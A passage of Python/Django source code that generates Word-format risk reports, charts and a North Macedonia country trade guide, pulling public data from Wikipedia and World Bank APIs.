                risk.residual_traffic_light()[1]
            )

            score_row[2].paragraphs[0].add_run('Targeted:').bold = True
            format_risk_score(
                score_row[2].paragraphs[0].add_run(),
                risk.targeted_likelihood,
                risk.targeted_impact,
                risk.targeted_score(),
                risk.targeted_traffic_light()[0],
                risk.targeted_traffic_light()[1]
            )

            # Line 4: Category, Last Assessed Date, and Last Approved Date (each in a separate cell)
            info_row = table.add_row().cells

            # Category
            category_run = info_row[0].paragraphs[0].add_run('Category: ')
            category_run.bold = True
            if risk.category:
                info_row[0].paragraphs[0].add_run(risk.category.name)
            else:
                info_row[0].paragraphs[0].add_run("N/A")

            # Last Assessed Date
            last_assessed_run = info_row[1].paragraphs[0].add_run('Last Assessed Date: ')
            last_assessed_run.bold = True
            if risk.last_assessed_date:
                last_assessed = risk.last_assessed_date.strftime('%d/%m/%Y')
                last_assessed_run = info_row[1].paragraphs[0].add_run(last_assessed)
            else:
                last_assessed_run = info_row[1].paragraphs[0].add_run("N/A")
                last_assessed_run.font.color.rgb = RGBColor(255, 0, 0)  # Red if no date available

            # Owners and Last Approval Dates
            owners_cell = info_row[2]
            owners_cell.paragraphs[0].add_run('Owners & Last Approval Date:').bold = True

            for owner in risk.owners.all():
                latest_approval = risk.approval_requests.filter(user=owner, status='approved').order_by('-response_date').first()

                # Only display the role, not the username
                owner_run = owners_cell.add_paragraph().add_run(f"{owner.role} - ")

                if latest_approval and latest_approval.response_date:
                    # Calculate approval cycle
                    cycle_timedelta = risk.get_approval_cycle_timedelta()

                    # Check if the last approval is within the approval cycle
                    last_approval_date = latest_approval.response_date
                    approval_due_threshold = last_approval_date + cycle_timedelta
                    current_date = timezone.now()

                    # Check if approval is overdue
                    if current_date > approval_due_threshold:
                        color = RGBColor(255, 0, 0)  # Red if overdue
                    else:
                        color = RGBColor(0, 128, 0)  # Green if within the cycle

                    owner_run.font.color.rgb = color
                    owners_cell.paragraphs[-1].add_run(last_approval_date.strftime('%d/%m/%Y'))
                else:
                    owner_run.font.color.rgb = RGBColor(255, 0, 0)  # Red if no approval exists
                    owners_cell.paragraphs[-1].add_run("N/A")

            # Add sections for Mitigations, Actions, Indicators, Events, and Procedures
            def add_section(section_title, items, color):
                if items.exists():
                    # Section title row, merge the columns
                    section_row = table.add_row().cells
                    section_row[0].merge(section_row[1]).merge(section_row[2])
                    title_run = section_row[0].paragraphs[0].add_run(section_title)
                    title_run.bold = True
                    title_run.font.color.rgb = color

                    # Iterate over items
                    for item in items.all():
                        # Title row for each item
                        item_title_row = table.add_row().cells
                        item_title_row[0].merge(item_title_row[1]).merge(item_title_row[2])
                        item_title_row[0].paragraphs[0].add_run(f'Title: {item.title}').bold = True

                        # Description row for each item
                        item_description_row = table.add_row().cells
                        item_description_row[0].merge(item_description_row[1]).merge(item_description_row[2])
                        item_description_row[0].paragraphs[0].add_run(f'Description: {clean_html_tags(item.description)}')

            # Add each section
            add_section('Mitigations', risk.mitigations, RGBColor(173, 216, 230))  # Light blue
            add_section('Actions', risk.actions, RGBColor(144, 238, 144))  # Light green
            add_section('Indicators (KPIs/KRIs)', risk.indicators, RGBColor(255, 255, 224))  # Light orange
            add_section('Events', risk.events, RGBColor(255, 218, 185))  # Light peach
            add_section('Procedures', risk.procedures, RGBColor(211, 211, 211))  # Light grey

            # Handle risk comments and mitigations
            add_risk_comments(document, risk)

            document.add_page_break()
@permission_required('orm.can_view_reports', raise_exception=True)
def generate_annual_report_en(request):
    # Reference to the logo path in the static folder
    logo_path = finders.find('images/avax-logo.jpeg')

    if not logo_path:
        raise FileNotFoundError('Logo file not found in static/images.')

    # Create a buffer to hold the ZIP data
    buffer = BytesIO()

    with zipfile.ZipFile(buffer, 'w') as zip_archive:
        # Create the main report document
        main_report = Document()
        set_calibri_font(main_report)
        add_company_logo_gr(main_report, logo_path)
        add_cover_page_en(main_report)
        add_table_of_contents_en(main_report)
        add_executive_summary_en(main_report)
        # add_summary_section_sorted_by_residual_score(main_report)
        add_executive_risk_severity_list_en(main_report)
        add_page_numbers_en(main_report)

        # Save the main report in memory
        main_report_io = BytesIO()
        main_report.save(main_report_io)
        main_report_io.seek(0)

        # Add the main report to the zip file
        zip_archive.writestr(f'annual_risk_report_ENGLISH.docx', main_report_io.read())

        portfolios= Portfolio.objects.exclude(
        Q(name__icontains='archive') | Q(name__icontains='sub') | Q(name__icontains='set')
        
    ).order_by('name')
        selected_portfolios= sorted(
                [
                    portfolio for portfolio in portfolios
                    if not any(keyword in portfolio.name.lower() for keyword in ['archive', 'sub', 'set'])
                ],
                key=lambda portfolio: portfolio.name.lower()
        )
        
        # Create the annex document
        annex_report = Document()
        set_calibri_font(annex_report)
        add_company_logo_gr(annex_report, logo_path)
        annex_report.add_heading('Annex 1: Risks by Portfolio', level=1)
        add_residual_risk_pivot_section_perportfolio_en(annex_report,selected_portfolios)
        add_page_numbers_gr(annex_report)

        # Save the annex in memory
        annex_report_io = BytesIO()
        annex_report.save(annex_report_io)
        annex_report_io.seek(0)

        # Add the annex to the zip file
        zip_archive.writestr(f'annex1_risks_by_portfolio_ENGLISH.docx', annex_report_io.read())

    # Set the buffer position to the beginning
    buffer.seek(0)

    # Create the response
    response = HttpResponse(buffer, content_type='application/zip')
    response['Content-Disposition'] = f'attachment; filename="annual_report_ENGLISH.zip"'

    return response


def add_risk_comments(document, risk):
    # Retrieve scores (Inherent, Residual, Targeted)
    inherent_score = risk.inherent_score()  # Inherent score
    residual_score = risk.residual_score()  # Residual score
    targeted_score = risk.targeted_score()  # Targeted score

    # Check if mitigations exist for the risk
    has_mitigations = risk.mitigations.exists()  # Returns True if there are any mitigations

    # Add an empty paragraph for a new line before the table
    document.add_paragraph()  # Adds a new line (empty paragraph)

    # Create a table for the comments
    table = document.add_table(rows=4, cols=2)  # Add one more row to the table for the new comment
    table.style = 'Light Shading Accent 1'  # Prettier table style

    # Adjust borders for all cells to ensure they print correctly
    for row in table.rows:
        for cell in row.cells:
            set_cell_border(cell)

    # First row of the table - Headers
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = "Score Type"  # Header: Score Type
    hdr_cells[1].text = "Comments"  # Header: Comments

    # Second row of the table - Inherent and Residual score
    row_cells = table.rows[1].cells
    row_cells[0].text = "Inherent vs Residual Score"  # Inherent vs Residual Score

    if residual_score < inherent_score:
        row_cells[1].text = f"The reduction was effective as the residual score ({residual_score}) is lower than the inherent score ({inherent_score})."
        if not has_mitigations:
            # Highlight the lack of mitigation with red text
            row_cells[1].add_paragraph()  # Add an extra line for the red warning
            warning_paragraph = row_cells[1].add_paragraph()
            warning_run = warning_paragraph.add_run("However, there are no mitigation actions.")
            warning_run.font.color.rgb = RGBColor(255, 0, 0)  # Red color for highlighting
            warning_run.bold = True  # Bold text for emphasis
    else:
        row_cells[1].text = f"The reduction was not effective as the residual score ({residual_score}) is similar to the inherent score ({inherent_score})."

    # Third row of the table - Targeted and Residual score
    row_cells = table.rows[2].cells
    row_cells[0].text = "Targeted vs Residual Score"  # Targeted vs Residual Score

    if targeted_score < residual_score:
        run = row_cells[1].paragraphs[0].add_run(
            f"However, additional actions are required to achieve the targeted score ({targeted_score})."
        )
        run.font.color.rgb = RGBColor(255, 0, 0)  # Red color for the "however" case
    elif targeted_score == residual_score:
        row_cells[1].text = f"No additional actions are required as the residual score matches the targeted score ({targeted_score})."
    else:
        warning_text = (
            f"The targeted score ({targeted_score}) is lower than the residual score, "
            "but no actions have been taken. Warning: Targeted scores cannot be reduced without additional actions."
        )
        row_cells[1].text = warning_text

        # Apply italics to the warning
        warning_run = row_cells[1].paragraphs[0].runs[0]
        warning_run.italic = True

    # Add fourth row for comments in case of lack of mitigation
    row_cells = table.rows[3].cells
    row_cells[0].text = "Comments on Risk Reduction without Mitigation Actions"  # New row for mitigation comments

    if not has_mitigations and residual_score < inherent_score:
        # Highlight lack of mitigation actions despite risk reduction
        row_cells[1].text = "The residual score has been reduced, but there are no mitigation actions."
        row_cells[1].paragraphs[0].runs[0].font.color.rgb = RGBColor(255, 0, 0)  # Red color for warning
        row_cells[1].paragraphs[0].runs[0].bold = True  # Bold text for emphasis
    else:
        row_cells[1].text = "There are mitigation actions supporting the risk reduction."




from django.db.models import Q, F, ExpressionWrapper, IntegerField, Count

def generate_portfolio_category_risk_chart(selected_portfolios, title="Risk (Residual) Levels by Category for Selected Portfolios"):
    # Filter risks based on selected portfolios and calculate residual score
    risks_by_category = Risk.objects.filter(portfolio__in=selected_portfolios).annotate(
        residual_score=ExpressionWrapper(
            F('residual_likelihood') * F('residual_impact'),
            output_field=IntegerField()
        )
    ).values('category__name').annotate(
        total=Count('id'),
        high=Count('id', filter=Q(residual_score__gte=15)),
        medium=Count('id', filter=Q(residual_score__gte=7, residual_score__lt=15)),
        low=Count('id', filter=Q(residual_score__lt=7))
    ).order_by('-category__name')

    # Prepare data for the chart
    labels = [c['category__name'] for c in risks_by_category]
    high_risks = [c['high'] for c in risks_by_category]
    medium_risks = [c['medium'] for c in risks_by_category]
    low_risks = [c['low'] for c in risks_by_category]

    # Generate and return the bar chart
    return generate_portfolio_bar_chart(labels, high_risks, medium_risks, low_risks, title)



import matplotlib.pyplot as plt
from matplotlib.ticker import MaxNLocator
import io
import base64

def generate_portfolio_bar_chart(labels, high_risks, medium_risks, low_risks, title):
    # Replace any None values in labels and risk level lists with defaults
    labels = ['Unknown' if label is None else label for label in labels]
    high_risks = [0 if value is None else value for value in high_risks]
    medium_risks = [0 if value is None else value for value in medium_risks]
    low_risks = [0 if value is None else value for value in low_risks]

    # Calculate the total risks for each label
    total_risks = [h + m + l for h, m, l in zip(high_risks, medium_risks, low_risks)]
    overall_total_risks = sum(total_risks)

    # Set up figure size for a full A4 landscape page
    fig, ax = plt.subplots(figsize=(16.5, 11.7))  # A4 landscape size in inches

    # Create stacked horizontal bar chart segments
    bars_low = ax.barh(labels, low_risks, color='green', edgecolor='black', label='Low')
    bars_medium = ax.barh(labels, medium_risks, left=low_risks, color='orange', edgecolor='black', label='Medium')
    bars_high = ax.barh(labels, high_risks, left=[l + m for l, m in zip(low_risks, medium_risks)], color='red', edgecolor='black', label='High')

    # Display individual risk counts and total risks for each bar
    for bar_low, bar_medium, bar_high, total, low, medium, high in zip(bars_low, bars_medium, bars_high, total_risks, low_risks, medium_risks, high_risks):
        # Print counts for each risk level inside the bars
        if low > 0:
            ax.text(bar_low.get_width() / 2, bar_low.get_y() + bar_low.get_height() / 2, f'{low}', ha='center', va='center', fontsize=11, color='white')
        if medium > 0:
            ax.text(bar_medium.get_x() + bar_medium.get_width() / 2, bar_medium.get_y() + bar_medium.get_height() / 2, f'{medium}', ha='center', va='center', fontsize=11, color='black')
        if high > 0:
            ax.text(bar_high.get_x() + bar_high.get_width() / 2, bar_high.get_y() + bar_high.get_height() / 2, f'{high}', ha='center', va='center', fontsize=11, color='white')

        # Place the total risks above each bar
        ax.text(total + 0.5, bar_high.get_y() + bar_high.get_height() / 2, f'{total}', ha='center', fontsize=12, fontweight='bold')

    # Set x and y labels with larger fonts
    ax.set_xlabel('Number of Risks', fontsize=14)
    ax.set_ylabel('Categories', fontsize=14)

    # Display the title with the overall total risks on a separate line
    ax.set_title(f'{title}\nTotal Risks: {overall_total_risks}', loc='left', fontsize=16, fontweight='bold', pad=30)

    # Increase font size of y-axis labels for readability
    ax.tick_params(axis='y', labelsize=12)

    # Add legend
    ax.legend(fontsize=12, loc='upper right')

    # Adjust layout to ensure space for the labels and title
    plt.tight_layout()

    # Save the plot to a BytesIO buffer
    buffer = io.BytesIO()
    plt.savefig(buffer, format='png')
    plt.close()
    buffer.seek(0)

    # Convert the buffer to a base64 image
    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
    return f"data:image/png;base64,{image_base64}"
# my_app/views.py


# --------------------------------------------------------------------------------------------------------->
from django.http import HttpResponse
from docx import Document
from docx.shared import Pt, Inches
import matplotlib.pyplot as plt
import pandas as pd
import requests
import datetime
import io

def format_large_number(value):
    """Format large numbers as billions or trillions for readability."""
    if value >= 1_000_000_000_000:
        return f"{value / 1_000_000_000_000:.2f} trillion"
    elif value >= 1_000_000_000:
        return f"{value / 1_000_000_000:.2f} billion"
    else:
        return f"{value:,.2f}"

def fetch_country_intro_and_economy(country):
    intro_text = "Introduction not available."
    economy_text = "Economy section not available."
    try:
        url = f"https://en.wikipedia.org/api/rest_v1/page/summary/{country}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            intro_text = data.get('extract', intro_text)
        url_economy = f"https://en.wikipedia.org/api/rest_v1/page/summary/{country}/Economy"
        response = requests.get(url_economy)
        if response.status_code == 200:
            data = response.json()
            economy_text = data.get('extract', economy_text)
    except Exception as e:
        intro_text = f"Could not fetch background information: {e}"
    return intro_text, economy_text

def fetch_country_info_from_wikipedia(country):
    country_info = {
        "currency_code": "Unavailable",
        "currency": "Unavailable",
        "description": "Information not available."
    }

    try:
        url = f"https://en.wikipedia.org/api/rest_v1/page/summary/{country}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            country_info["description"] = data.get("extract", "Description not available.")
            if country == "North Macedonia":
                country_info["currency"] = "Macedonian Denar"
                country_info["currency_code"] = "MKD"
            elif country == "Greece":
                country_info["currency"] = "Euro"
                country_info["currency_code"] = "EUR"
    except Exception as e:
        country_info["description"] = f"Could not fetch detailed information: {e}"

    return country_info

def fetch_credit_ratings(country):
    ratings = {
        "Greece": {
            "Moody's": "Ba1 (Positive Outlook)",
            "S&P": "BBB- (Positive Outlook)",
            "Fitch": "BBB- (Stable Outlook)"
        },
        "North Macedonia": {
            "Fitch Ratings": "BB+ (Stable Outlook)",
            "S&P Global Ratings": "BB- (Stable Outlook)"
        }
    }
    return ratings.get(country, {})

def fetch_economic_indicators(country_code, eu_code, indicators):
    collected_data = {}
    for indicator_id, (indicator_name, unit) in indicators.items():
        country_data = get_indicator_data(country_code, indicator_id)
        eu_data = get_indicator_data(eu_code, indicator_id)

        if country_data is not None and not country_data.empty and eu_data is not None and not eu_data.empty:
            combined_data = pd.merge(country_data, eu_data, on="Year", how="inner").sort_values(by="Year")
            collected_data[indicator_id] = combined_data
        else:
            collected_data[indicator_id] = None
    return collected_data

def get_indicator_data(country_code, indicator_id):
    url = f"http://api.worldbank.org/v2/country/{country_code}/indicator/{indicator_id}?date=2015:2022&format=json"
    response = requests.get(url)
    if response.status_code == 200:
        json_data = response.json()
        if json_data and len(json_data) > 1:
            data = json_data[1]
            df = pd.DataFrame.from_records(
                [(entry['date'], entry['value']) for entry in data if entry['value'] is not None],
                columns=['Year', f"{indicator_id}_{country_code}"]
            ).sort_values(by="Year")
            df['Year'] = df['Year'].astype(int)
            return df
    return None

def fetch_currency_rate(base_currency, target_currency):
    """Fetch the exchange rate from base_currency to target_currency."""
    try:
        url = f"https://api.exchangeratesapi.io/latest?base={base_currency}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data['rates'].get(target_currency, "Exchange rate not found")
        return "Exchange rate not available"
    except Exception as e:
        return f"Error fetching exchange rate: {e}"

def add_separate_gdp_graphs(doc, data, indicator_id, indicator_name, country, country_code):
    """Generate larger, separate graphs for country and EU GDP comparison."""
    if data is not None and not data.empty:
        # Plot Country GDP
        fig, ax = plt.subplots()
        ax.plot(data['Year'], data[f"{indicator_id}_{country_code}"] / 1e9, marker='o', label=f"{country} GDP (Billion)")
        ax.set_xlabel('Year')
        ax.set_ylabel('GDP (Billion USD)')
        ax.set_title(f'{indicator_name} for {country}')
        ax.legend()
        ax.grid(True)

        img_stream = io.BytesIO()
        plt.savefig(img_stream, format='png')
        plt.close(fig)
        img_stream.seek(0)
        doc.add_picture(img_stream, width=Inches(5))

        # Plot EU GDP
        fig, ax = plt.subplots()
        ax.plot(data['Year'], data[f"{indicator_id}_EUU"] / 1e12, marker='x', linestyle='--', label="EU GDP (Trillion)")
        ax.set_xlabel('Year')
        ax.set_ylabel('GDP (Trillion USD)')
        ax.set_title(f'{indicator_name} for EU')
        ax.legend()
        ax.grid(True)

        img_stream = io.BytesIO()
        plt.savefig(img_stream, format='png')
        plt.close(fig)
        img_stream.seek(0)
        doc.add_picture(img_stream, width=Inches(5))

        # Add comments about GDP trends
        doc.add_paragraph(
            f"The GDP comparison shows the economic scale difference between {country} and the EU. The graphs illustrate "
            f"how {country}'s GDP trends compare with the significantly larger EU GDP."
        )
    else:
        doc.add_paragraph(f"No data available for {indicator_name} for {country} or EU")

def add_graph_to_doc(doc, data, indicator_id, indicator_name, country, country_code):
    """Generate and embed a graph into the Word document."""
    if data is not None and not data.empty:
        fig, ax = plt.subplots()
        max_value = max(data[f"{indicator_id}_{country_code}"].max(), data[f"{indicator_id}_EUU"].max())

        scale = 1
        unit_label = ""
        if max_value >= 1e12:
            scale = 1e12
            unit_label = "Trillion"
        elif max_value >= 1e9:
            scale = 1e9
            unit_label = "Billion"
        elif max_value >= 1e6:
            scale = 1e6
            unit_label = "Million"

        ax.plot(data['Year'], data[f"{indicator_id}_{country_code}"] / scale, marker='o', label=country)
        ax.plot(data['Year'], data[f"{indicator_id}_EUU"] / scale, marker='x', linestyle='--', label='EU')
        ax.set_xlabel('Year')
        ax.set_ylabel(f'{indicator_name} ({unit_label})')
        ax.set_title(f'{indicator_name} Comparison: {country} vs EU')
        ax.legend()
        ax.grid(True)

        img_stream = io.BytesIO()
        plt.savefig(img_stream, format='png')
        plt.close(fig)
        img_stream.seek(0)
        doc.add_picture(img_stream, width=Inches(5))
    else:
        doc.add_paragraph(f"No data available for {indicator_name} for {country}")


def add_trade_guide_section(doc, country):
    """Add a comprehensive trade guide section based on the selected country."""
    # Add introductory heading
    
    # Hard-coded text data for North Macedonia
    if country == "North Macedonia":
        # Introduction Section
        doc.add_heading("Country Commercial Guide Overview\n", level=2)
        
        doc.add_paragraph("The following data has been retrieved from https://www.trade.gov/north-macedonia-country-commercial-guide.", style='Normal')

        doc.add_paragraph(
            "The Country Commercial Guide (CCG) is an offical US Goverment source about how to do business in an international market. "
            "Authored by seasoned trade experts at U.S. embassies and consulates, the guides provide insight into economic conditions, "
            "leading sectors, selling techniques, customs, regulations, standards, business travel, and more. Country Commercial Guides are "
            "available for 140+ markets.", style='Normal'
        )
        doc.add_paragraph(
            "Last published date: 2024-05-27"
        )  # No italic style available by default

       
        doc.add_page_break()
        # Sub-section: Executive Summary
        doc.add_heading("\nExecutive Summary\n", level=2)
        doc.add_paragraph(
            "North Macedonia, an EU candidate and NATO member since 2020, remains open to U.S. investments. Challenges in 2022 included higher energy prices, inflation, and supply chain disruptions due to the Ukraine conflict, limiting GDP growth to 2.1%. The government implemented stimulus measures, reducing unemployment to 14%. The Growth Acceleration Plan targets doubling GDP growth to 5% by 2026, creating 156,000 jobs, and promoting 'green growth' to cut emissions."
            , style='Normal'
        )
        doc.add_paragraph(
            "Despite a generally favorable business climate aligned with international standards, corruption remains an issue. The Technological Industrial Development Zones have yielded positive investment experiences, though regulatory inconsistencies and complex legislation persist. Transparency International ranked North Macedonia 85th out of 180 countries in 2022."
            , style='Normal'
        )
        doc.add_paragraph(
            "Government efforts in 2022 focused on mitigating the energy crisis and inflation, while continuing to attract foreign investment in transportation and energy infrastructure. Anti-corruption inquiries have targeted high-level officials, and reforms are underway to improve governance."
            , style='Normal'
        )
        doc.add_paragraph(
            "Fitch Ratings reaffirmed North Macedonia's BB+ rating (negative outlook), while S&P maintained its BB- (stable outlook). Key investment opportunities for 2023 include digitalization, green energy, and near-shoring due to North Macedonia's strategic location along key transport corridors."
            , style='Normal'
        )


        # doc.add_heading("Report Topics", level=2)
        # topics = [
        #     "Business Environment in North Macedonia: This section provides an overview of market opportunities, entry strategies, key economic indicators, trade statistics, and the strategic benefits for companies considering business activities in North Macedonia.",
        #     "Customs, Regulations, and Standards: An overview of tariff and non-tariff barriers, export controls, import requirements and documentation, product standards, and trade agreements.",
        #     "Market Entry Strategies for U.S. Products and Services: Insights into effective market entry methods, including the use of agents/distributors, sales channels, pricing strategies, financing options, and opportunities for joint ventures or government contracts.",
        # ]
        # for topic in topics:
        #     bold_topic, description = topic.split(":", 1)
        #     p = doc.add_paragraph()
        #     p.add_run(bold_topic + ":").bold = True
        #     p.add_run(description).bold = False
        #     p.style = 'List Bullet'


        # Market Overview
        doc.add_heading("Business Environment in North Macedonia", level=2)

        # Market Overview
        doc.add_heading("Market Overview\n", level=3)
        doc.add_paragraph(
            "The Republic of North Macedonia is an emerging market. With a population of 1.8 million, this small, land-locked country "
            "in Southeastern Europe has made great strides in reforming its economy over the past two decades but remains one of Europe’s poorer countries.",
            style='Normal'
        )
        doc.add_paragraph(
            "North Macedonia has been committed to securing and furthering its Euro-Atlantic path. In March 2020, the country became the 30th NATO member; in July 2022, "
            "the country held its first Intergovernmental Conference with the European Union, launching accession negotiations. The government has continued to publicly "
            "support regional integration efforts and continued to issue procurement tenders. Basic economic and commercial facts about North Macedonia include:",
            style='Normal'
        )
        doc.add_page_break()

        # Key Economic and Commercial Facts
        doc.add_heading("Key Economic and Commercial Facts\n", level=4)
        facts = [
            "Stable currency pegged to the euro",
            "NATO Ally and EU candidate country",
            "Open economy that welcomes foreign direct investment and trade",
            "Sound macroeconomic fundamentals",
            "English-speaking workforce",
            "Low taxes: 10 percent on corporate income",
            "Unemployment rate of 13.1 percent in Q2 2022",
            "Most of North Macedonia’s FDI comes from Europe, namely: Germany, Austria, Slovenia, the Netherlands, Greece, and Bulgaria.",
            "Competitive wages (average monthly salary of $633 as of June 2023)",
            "Middle-income country with per capita income of $6,554 in 2022",
            "Inflation rate of 8.3 percent in July 2023 (around 9 percent forecast for 2023)",
            "Total 2022 trade of $21.5 billion (imports plus exports)",
            "Largest trading partners in 2022 were Germany, UK, Greece, Serbia, and Bulgaria",
            "U.S. – North Macedonia trade in 2022 totaled $275.8 million, of which U.S. exports to North Macedonia were $48.7 million.",
            "Member of European Free Trade Agreement (EFTA) and Central European Free Trade Agreement (CEFTA); bilateral Free Trade Agreements with Turkey and Ukraine.",
            "Founding member of the Open Balkan Initiative, alongside Serbia and Albania."
        ]
        for fact in facts:
            doc.add_paragraph(fact, style='List Bullet')

        # Market Challenges
        doc.add_heading("Market Challenges\n", level=3)
        challenges = [
            "Slow-moving judicial system.",
            "Some legislative and regulatory contradictions.",
            "Relatively slow bureaucracy.",
            "Weak rule of law and corruption issues.",
            "Irregular tendering processes.",
            "Inconsistent enforcement of intellectual property rights.",
            "Delays in collecting payments from both public and private sector entities.",
            "Needed improvements to transportation infrastructure.",
            "Upcoming parliamentary and presidential elections, likely to occur in the first half of 2024, could limit the availability and willingness of government officials to commit to new projects."
        ]
        for challenge in challenges:
            doc.add_paragraph(f"{challenge}", style='List Bullet')


        # Market Opportunities
        doc.add_heading("Market Opportunities\n", level=3)
      

        opportunities = [
            "Energy – The government has privatized some energy assets and is providing concessions for other energy opportunities. EVN, the private electricity distribution company, continues to make substantial infrastructure investments.",
            "Transportation – The current government of North Macedonia prioritizes upgrades to the country’s transportation infrastructure and is looking for trusted international companies for road and rail projects.",
            "Information Technology and Computers – This growing sector continues to provide opportunities for U.S. companies, both by providing hardware, software, and services to local entities and by setting up remote service providers in-country to take advantage of North Macedonia’s talent pool.",
            "Construction – There are both export and investment opportunities available for U.S. companies in the construction and building materials sector.",
            "Hotel and Restaurant Equipment/Tourism – The country’s geographic location, scenic areas, and historical and religious sites provide opportunities for tourism industry investment, development, and management.",
            "Agriculture – Agriculture is an important segment of the economy with expanded opportunities for U.S. exports of fertilizer, farming equipment, and food processing machinery."
        ]
        for opp in opportunities:
            doc.add_paragraph(opp, style='List Bullet')
            
        doc.add_heading("Market Entry Strategy\n", level=3)
        entry_strategies = [
            "The best strategy to enter the market varies according to the product, service, industry, and the company’s long-term strategy.",
            "Visiting the country to determine the best market entry strategy.",
            "Conducting due diligence before choosing local agents or distributors.",
            "Maintaining close contact with local agents or distributors.",
            "Establishing qualified local legal services for contract negotiations."
        ]
        for strategy in entry_strategies:
            doc.add_paragraph(f"{strategy}", style='List Bullet')
            
        doc.add_page_break()

        # Main section heading
        doc.add_heading("Customs, Regulations & Standards", level=2)

        # Sub-section headings
       
# Sub-section: Trade Barriers
        # Sub-section: Trade Barriers
        doc.add_heading("Trade Barriers\n", level=3)
      
        doc.add_paragraph(
            "Several products are subject to quality control by market inspection officials at customs offices. These officials are employed by the Ministry of Economy to ensure that imported goods are in compliance with domestic standards. Products subject to quality control include:", style='Normal'
        )
        trade_barriers = [
            "Most agriculture products",
            "Cars",
            "Electrical appliances",
            "Products in which poor quality may pose a health risk to consumers"
        ]
        for barrier in trade_barriers:
            doc.add_paragraph(f"{barrier}", style='List Bullet')

        doc.add_paragraph(
            "When applicable, products also must pass sanitary, phytopathology, or veterinary control. (Additional information on sanitary requirements can be obtained from the Ministry of Health; phytopathology and veterinary requirements can be obtained from the Ministry of Agriculture, Forestry, and Water Resource Management.)",
            style='Normal'
        )

        doc.add_paragraph(
            "Import regulations are numerous and are not always available in English."
        )
     
        # Sub-section: Import Tariffs
        doc.add_heading("Import Tariffs\n", level=3)
        
        doc.add_paragraph(
            "North Macedonia joined the World Trade Organization (WTO) in 2003. As a WTO member, North Macedonia has committed itself to the three basic rules of trade conduct:", style='Normal'
        )
        trade_commitments = [
            "Legislative and regulatory transparency",
            "Equal rights and privileges for foreign and domestic firms and citizens",
            "Most-favored nation treatment"
        ]
        for commitment in trade_commitments:
            doc.add_paragraph(f"{commitment}", style='List Bullet')

        doc.add_paragraph(
            "As an EU candidate, North Macedonia continues to harmonize its customs laws with EU laws and regulations.", style='Normal'
        )

        doc.add_paragraph(
            "Customs duties generally apply to most products imported into North Macedonia. Preferential tariffs apply to countries with which North Macedonia has signed a bilateral Free Trade Agreement, as well as to countries participating in multilateral trade agreements, such as:", style='Normal'
        )
        trade_agreements = [
            "EU Stabilization and Association Agreement (SAA)",
            "European Free Trade Agreement (EFTA)",
            "Central European Free Trade Agreement (CEFTA)"
        ]
        for agreement in trade_agreements:
            doc.add_paragraph(f"{agreement}", style='List Bullet')

        doc.add_paragraph(
            "Customs tariffs in 2023 range from 0–35 percent and are revised and amended annually, in conformity with the amendments to the Combined Nomenclature of the European Union. Tariffs are determined by the Customs Tariff Law (Official Gazette of the Republic of North Macedonia No. 23/2003, 69/2004, 10/2008, 35/2010, 11/2012, 93/2013, 44/2015, and 81/2015).",
            style='Normal'
        )

        doc.add_paragraph(
            "Key details regarding tariffs and duties:", style='Normal'
        )
        tariff_details = [
            "No tariffs applied on most raw materials.",
            "Excise duties apply to alcohol, cigarettes, mineral oils, tobacco, petroleum coke, and passenger vehicles.",
            "Excise duties are determined by the type and quantity of the product and are levied in addition to the customs tariff.",
            "The customs tariff on new and used automobiles is five percent. However no tariffs on automobiles produced in EU countries.",
            "No duties for industrial products originating from EU, EFTA, CEFTA countries, Turkey, and Ukraine.",
            "Variable levies for agricultural and food products.",
            "Import tariff quotas for tobacco, wine, and various fruits."
        ]
        for detail in tariff_details:
            doc.add_paragraph(f"{detail}", style='List Bullet')

        doc.add_paragraph(
            "A value-added tax (VAT) of 18 percent applies to most products and services. Preferential rates include 5 percent for certain products and a newly introduced rate of 10 percent for specific non-essential items. VAT is assessed on the customs value plus customs duty and excises.", style='Normal'
        )

        doc.add_paragraph(
            "Note: Amid the global energy and food crisis, the Government of North Macedonia has removed VAT on basic food products and reduced VAT and lowered excise duties on fuels within a set of temporary measures.",
            style='Normal'
)

        
        # Sub-section: Import Requirements and Documentation
        doc.add_heading("Import Requirements and Documentation\n", level=3)
        

        doc.add_paragraph(
            "An importer/exporter in North Macedonia is responsible for providing the required import/export documentation, which consists of common trade, transport, and customs documentation, as well as certificates of origin and certificates of quality control and licenses. Service providers are not subject to customs regulations, but foreign trade transactions are subject to a documentation fee of one percent.",
            style='Normal'
        )


                # Sub-section: Labeling and Marking Requirements
        doc.add_heading("Labeling and Marking Requirements\n", level=3)
    
        doc.add_paragraph(
            "Labels must contain the following information: quality, ingredients, quantity, manner of storage, transport, use, maintenance, country of origin, and a “best before” date. The above information must be written in the Macedonian and Albanian languages.",
            style='Normal'
        )


        # Sub-section: Prohibited and Restricted Imports
        doc.add_heading("Prohibited and Restricted Imports\n", level=3)
      
        doc.add_paragraph(
            "Chemicals, weapons, ammunition, pesticides, agricultural products, and some other categories of products may require import licenses from the responsible ministry. Visit the Customs Administration website for details.",
            style='Normal'
        )
# Sub-section: Standards for Trade
        doc.add_heading("Standards for Trade", level=3)

        # Overview
        doc.add_heading("Overview", level=4)
        doc.add_paragraph(
            "The process of developing, certifying, and enforcing standards is undergoing reform in North Macedonia, "
            "and the government’s standards bodies have adopted the Code of Good Practice for the preparation, adoption, and application of standards.",
            style='Normal'
        )

# Standards
        doc.add_heading("Standards", level=4)
        doc.add_paragraph(
            "In accordance with the WTO/TBT Agreement (Agreement to Technical Barriers to Trade), standards are regulated and developed by the following institutions:",
            style='Normal'
        )

        # Regulatory Functions
        doc.add_heading("Regulatory functions:", level=5)
        regulatory_functions = [
            "Ministry of Economy, acting as a coordinator.",
            "Other Ministries for specific topic areas."
        ]
        for func in regulatory_functions:
            doc.add_paragraph(func, style='List Bullet')

      

       
      # Sub-section: Trade Agreements
        doc.add_heading("Trade Agreements", level=3)

        doc.add_paragraph(
            "\nNorth Macedonia became a member of the Central European Trade Agreement (CEFTA) in 2000. In December 2006, CEFTA expanded to include "
            "Albania, Bosnia and Herzegovina, Croatia (Note: in 2013 Croatia joined the EU and left CEFTA), Kosovo, North Macedonia, Moldova, "
            "Montenegro, and Serbia. North Macedonia has additional Free Trade Agreements (FTAs) with Turkey and Ukraine. "
           ,
            style='Normal'
        )
        
        doc.add_paragraph(
            
            "In February 2001, North Macedonia signed a Stabilization and Association Agreement (SAA) with the European Union (EU), and in December "
